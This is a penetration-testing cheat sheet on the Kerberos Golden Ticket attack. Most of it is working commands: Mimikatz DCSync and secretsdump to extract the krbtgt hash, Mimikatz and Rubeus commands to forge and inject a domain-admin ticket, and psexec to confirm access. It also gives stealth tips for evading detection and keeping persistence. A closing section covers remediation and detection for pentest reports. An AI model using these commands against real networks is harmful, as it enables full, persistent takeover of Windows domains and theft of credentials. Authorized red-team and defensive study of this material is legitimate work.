# Golden Ticket Attack

Full syntax and every flag explained: [Mimikatz](../../tools/mimikatz.md) and [Rubeus](../../tools/rubeus.md)

---

## What It Is

The krbtgt account signs every Kerberos TGT in the domain. If you have its hash, you can forge a TGT for **any user** that the DC will accept as valid — including fake users, expired users, or users you just made up. That forged ticket = access to everything.

---

## When You Use This

**You just dumped krbtgt hash** (via DCSync or NTDS.dit) and want:
- Persistent access even after password resets
- Re-entry if you lose your DA shell
- Access as Administrator without needing their actual password

**You do NOT need this** if you still have an active DA session — just use it directly. Golden Ticket is for persistence and re-entry.

---

## Step by Step

### Step 1 — Get the krbtgt hash (need DA first)
```sh
# Mimikatz DCSync
lsadump::dcsync /domain:corp.local /user:krbtgt

# Or secretsdump from Linux
secretsdump.py corp.local/admin:'Password'@<DC-IP> -just-dc-ntlm
# Find the krbtgt line in output
```

### Step 2 — Get the Domain SID
```sh
# From DCSync output above — take the SID, remove last segment
# S-1-5-21-111-222-333-502  →  domain SID = S-1-5-21-111-222-333

# Or on any domain machine:
whoami /user   # Your SID — remove your RID from the end
```

### Step 3 — Generate and inject the ticket
```sh
# Mimikatz
kerberos::golden /User:FakeAdmin /domain:corp.local /sid:S-1-5-21-111-222-333 /krbtgt:<HASH> /id:500 /ptt
misc::cmd

# Rubeus (preferred — AES is stealthier)
.\Rubeus.exe golden /aes256:<KRBTGT-AES256> /domain:corp.local /sid:S-1-5-21-111-222-333 /user:FakeAdmin /ptt
```

### Step 4 — Verify access
```sh
dir \\dc01.corp.local\C$
psexec.exe \\dc01.corp.local cmd
```

---

## Golden vs Silver vs Diamond

| | Golden | Silver | Diamond |
|---|---|---|---|
| **Forges** | TGT (master ticket) | TGS (one service) | Patched real TGT |
| **Needs** | krbtgt hash | Service account hash | krbtgt AES + valid user |
| **Access** | Everything | One service only | Everything |
| **Detectable** | PAC validation | Very stealthy | Hardest to detect |

---

## Persistence Notes

- Golden Tickets survive **user password resets** — krbtgt hash does not change
- To invalidate Golden Tickets: reset krbtgt password **twice** (must wait between resets)
- Default ticket lifetime is 10 years in Mimikatz — set it to 10 hours to blend in
- Store your `.kirbi` file somewhere safe as a backup

---

## Remediation (For Report Writing)

**Root cause:** The krbtgt account is the cryptographic root of all Kerberos trust in the domain. Its password hash signs every TGT. If an attacker gets this hash (via DCSync or NTDS.dit dump), they can forge tickets indefinitely.

**There is no way to detect a well-crafted Golden Ticket in transit** — it looks like a legitimate TGT to DCs. Detection requires monitoring ticket issuance anomalies and logon events.

| Finding | Remediation |
|---|---|
| krbtgt hash was compromised | Reset the **krbtgt password twice** (two resets, separated by at least the maximum TGT lifetime — 10 hours by default — to let existing tickets expire). Kerberos validates tickets against both the current and previous krbtgt key, so a single reset only invalidates tickets older than the second-to-last reset. The first reset moves the compromised key to "previous"; the second reset retires it entirely. Microsoft's `Reset-KrbtgtKeyInteractive` script enforces this correctly. |
| DCSync was performed | Change the krbtgt password twice. Audit which accounts have DCSync rights and remove any non-standard accounts. |
| DA was compromised | Rotate ALL privileged account passwords. Assume every secret on the domain is burned. |
| No detection of ticket forgery | Monitor: Event ID 4769 (TGS requested) with unusual encryption types, Event ID 4672 (special privileges assigned) on DCs, and Kerberos tickets with lifetimes > 10 hours. |
| Protected Users not used | Add all privileged accounts to the **Protected Users** security group — 4-hour max ticket lifetime, no NTLM, no delegation. |

**Key point for reports:** Golden Ticket = full domain persistence that survives all user password resets. The only remediation is the double krbtgt reset and a full audit of how the attacker got DCSync rights in the first place — treat it as a full incident response scenario.
